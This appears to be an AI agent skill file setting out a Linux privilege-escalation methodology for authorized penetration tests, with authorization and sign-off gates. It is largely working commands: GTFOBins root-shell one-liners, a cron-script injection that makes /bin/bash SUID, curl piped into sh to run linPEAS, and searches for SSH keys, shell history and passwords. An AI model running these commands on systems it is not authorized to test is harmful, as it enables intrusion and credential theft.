---
name: linux-privesc
description: >
  Linux local privilege escalation methodology for authorized engagements
  on a single compromised host: SUID/SGID binary abuse, cron job abuse,
  Linux capabilities abuse, kernel exploit identification, sudo
  misconfiguration. Keywords: Linux privesc, SUID, SGID, cron, 
  capabilities, kernel exploit, sudo -l, GTFOBins, linpeas. Do NOT use
  for container escape specifically (see docker-attack/kubernetes-attack),
  or for Windows hosts (see windows-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [linpeas, pspy, gtfobins, linux-exploit-suggester]
depends_on: []
feeds_into: [chain-analysis, privesc-report, active-directory]
chains_with: [docker-attack, active-directory, iot-ics]
---

## Signals
- Low-privilege shell (web shell, SSH, reverse shell) on a Linux host.
- `sudo -l` lists commands runnable without full access, or any entry at all.
- SUID binaries beyond the standard base-OS set present on the filesystem.

## Prerequisites
- Written authorization covering the specific host.
- Any local shell, even unprivileged/www-data level.
- `linPEAS`, `pspy` (uploaded or run in-memory via curl pipe if outbound access allowed), reference to GTFOBins.

## Methodology

### 1. Automated enumeration first
```bash
curl -s https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh > linpeas_out.txt
# or upload the script if outbound internet is blocked
./linpeas.sh -a > linpeas_out.txt
# pspy to observe cron/process activity without root (no /proc polling privileges needed)
./pspy64 -pf -i 1000
```

### 2. sudo misconfiguration
```bash
sudo -l
# Cross-reference every listed binary against GTFOBins for a known privesc one-liner
# e.g. if "sudo /usr/bin/vim" is allowed:
sudo vim -c ':!/bin/sh'
# e.g. if "sudo /usr/bin/find" is allowed:
sudo find . -exec /bin/sh \; -quit
```

### 3. SUID/SGID binary hunting
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Cross-reference each non-standard result against GTFOBins
# e.g. SUID on /usr/bin/nmap (old versions with interactive mode):
nmap --interactive
nmap> !sh
```

### 4. Capabilities abuse (often missed by SUID-only hunts)
```bash
getcap -r / 2>/dev/null
# e.g. cap_setuid+ep on python3:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 5. Cron job abuse
```bash
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.*/
pspy64   # observe what actually runs and as whom, including undocumented cron entries
# If a world-writable script is run by root's cron:
echo '#!/bin/bash
chmod u+s /bin/bash' >> /path/to/writable-cron-script.sh
```

### 6. Writable PATH / library hijacking
```bash
echo $PATH
ls -la $(echo $PATH | tr ':' ' ')
# If a SUID binary calls an unqualified command and a writable PATH dir precedes the real one,
# drop a malicious binary with that name in the writable dir
```

### 7. Kernel exploit identification (last resort — can crash the host)
```bash
uname -a
./linux-exploit-suggester.sh
# Confirm CVE applicability (exact kernel version, distro patches) before running any PoC —
# kernel exploits are the most likely technique in this skill to crash/panic the host
```

### 8. Credential/key hunting
```bash
find / -name "*.bak" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
cat ~/.bash_history /root/.bash_history 2>/dev/null
grep -r "password" /var/www/ --include="*.php" --include="*.env" 2>/dev/null
```

## Tooling
`linPEAS`, `pspy`, `linux-exploit-suggester`, GTFOBins (reference site, not a tool — check every SUID/sudo binary found against it), `LinEnum` as a lighter alternative.

## Validation Gate
- Every privesc path must end in an actual root shell (`id` showing `uid=0`), not just "binary X is SUID and GTFOBins lists a technique."
- Cron-based privesc must be confirmed by observing the actual root-owned process execution (via `pspy`) before planting a payload, to avoid guessing at timing/ownership.
- Kernel exploit PoCs require explicit operator sign-off before execution — label as **Unproven** until actually run successfully, and flag the crash risk in the request for sign-off per the destructive-action gate.

## Gotchas
- Kernel exploits can panic/crash the host — always get explicit sign-off before running one, even with broad engagement scope, and prefer confirming via version/patch-level alone when a working shell isn't strictly required to prove the finding.
- `sudo -l` may require a password re-prompt depending on `timestamp_timeout` — a stale cached sudo token can give a false sense of passwordless sudo.
- GTFOBins techniques assume the binary is the *real* unmodified one — some hardened distros patch/wrap common binaries (e.g. restricted `vim`), so verify the technique actually works rather than assuming from the binary name.
- Writable cron scripts are often only writable by a specific group — confirm actual write access (`ls -la`, not just presence) before planning an exploit around them.
